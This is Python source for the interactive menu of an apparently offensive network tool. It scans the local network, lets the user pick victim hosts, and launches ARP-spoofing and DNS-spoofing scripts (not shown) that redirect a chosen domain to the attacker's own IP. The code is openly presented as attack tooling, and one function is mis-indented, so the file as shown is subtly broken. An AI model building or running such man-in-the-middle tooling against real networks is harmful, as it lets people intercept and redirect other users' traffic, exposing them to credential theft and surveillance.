import inquirer
import os
import sys
import threading
import time 
import scanner
from autocomplete import commands,descriptions, PathComplete, CommandComplete, HistoryClear
from color import *
from bar import bar
from terminaltables import DoubleTable
from banner import banner

listOfCommands = [ ["Command", "Description"],
        ["\n".join(commands), "\n".join(descriptions)]
        ]
tableOfCommands = DoubleTable(listOfCommands)

def Print(string):
	print(f"[+]═════════════[ {string} ]═════════════[+]")

def arper():
    try:
        if len(answers['IPS']) < 1:
            print(red("[-] No Devices On Your Network [-]"))
        else:
            os.system(f"terminator -e 'python3 arper.py {answers['IPS'][0]} {answers['IPS'][1]} {devices}' &")
    except:
        print(red("[-] Are You Okay?!, Set Your Targets [-]"))

def spoofer():
    try:
	os.system(f"terminator -e 'python3 spoofer.py {DOIPJ}' &")
    except:
        print(red("[-] Shshh Add Domains setDomains [-]"))

def setTargets():
    try:
        global answers
        questions = [
                inquirer.Checkbox('IPS',
                    message="Targets",
                    choices=devices.split("\n"),
                    ),
                ]
        answers = inquirer.prompt(questions)
    except:
        print(red("[-] Do You Like To Be Alone All The Time?[-]"))
        print(red("[-] Try scan [-]"))

def setDomains():
    global DOIPJ
    questions = [
            inquirer.Text('DomainName', message=light_green("[?] Enter Domain(i.e: google.com) [?]")),
            inquirer.Text('IP', message=light_green("[?] Enter IP(i.e: your machine IP(No local host) [?]"))
            ]
    answers = inquirer.prompt(questions)
    DOIP = {answers['DomainName']:answers['IP'], "www."+answers['DomainName']:answers['IP']}
    DOIPJ = ','.join('='.join((key,val)) for (key,val) in DOIP.items())

def interactive_shell():
    global devices
    global interfaces
    os.system("clear")
    banner()
    try:
        while True:
            CommandComplete()

            cmd = input(
                light_red("net@death")
                + light_green(" »")
                + reset()
            )

            if cmd != "":
                if cmd.split()[0] == "help":
                    Print("Help")
                    print(light_green(tableOfCommands.table))
                if cmd.split()[0] == "banner":
                    banner()
                if cmd.split()[0] == "scan":
                    bar()
                    devices, interfaces = scanner.scan()
                if cmd.split()[0] == "setTargets":
                    setTargets()
                if cmd.split()[0] == "setDomains":
                   setDomains()
                if cmd.split()[0] == "arper":
                    bar()
                    thread_Arper = threading.Thread(target=arper)
                    thread_Arper.start()
                if cmd.split()[0] == "DNSspoofer":
                    bar()
                    thread_Spoofer = threading.Thread(target=spoofer)
                    thread_Spoofer.start()
                if cmd.split()[0] == "clear":
                    os.system("clear")
                if cmd.split()[0] == "exit":
                    print(red("[~] Fuck Society, See You Later :) [~]"))
                    exit()
    except KeyboardInterrupt:
        print(red("[~] You Are Sick, Use exit :) [~]"))

interactive_shell()

